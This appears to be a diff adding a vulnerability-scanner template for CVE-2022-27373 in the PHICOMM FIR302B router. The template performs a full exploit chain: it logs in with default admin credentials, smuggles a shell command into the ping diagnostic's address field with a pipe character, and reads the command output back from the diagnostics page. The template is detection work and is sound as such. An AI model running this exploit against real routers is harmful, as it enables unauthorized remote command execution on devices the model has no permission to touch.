@@ -1,0 +1,74 @@
+id: cve-2022-27373
+
+info:
+  name: PHICOMM FIR302B management.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    phicomm Feixun fir302b is a router of Shanghai Feixun Data Communication Technology Co., Ltd. (phicomm), China.
+    Feixun fir302b has a security vulnerability that stems from the discovery of a Remote Command Execution (RCE) vulnerability through the Ping function.
+  reference:
+    - https://github.com/kitu232/feixun
+  classification:
+    cve-id: CVE-2022-27373
+  tags: command-execution, rce
+
+variables:
+  cmd: "id"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: "1"
+    raw:
+      - |
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action_mode=apply&next_page=index.html&current_page=login.html&username=admin&password=YWRtaW4%3D&login=%E7%99%BB%E5%BD%95
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "index.html"
+        part: body
+
+  - id: "2"
+    raw:
+      - |
+        POST /management.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action_mode=apply&next_page=sysDiag.html&current_page=sysDiag.html&doType=0&pingAddr=8.8.8.8|{{cmd}}&sendNum=4&pSize=64&overTime=10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "sysDiag.html"
+        part: body
+
+  - id: "3"
+    raw:
+      - |
+        GET /sysDiag.html HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: output
+        internal: true
+        group: 1
+        regex:
+          - "<textarea class=\"textarea\" wrap=\"off\" readonly=\"1\">((.|\\n)*?)</textarea>"
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "sysPwd.html"
+          - "ddnsCfg.html"
+        part: body
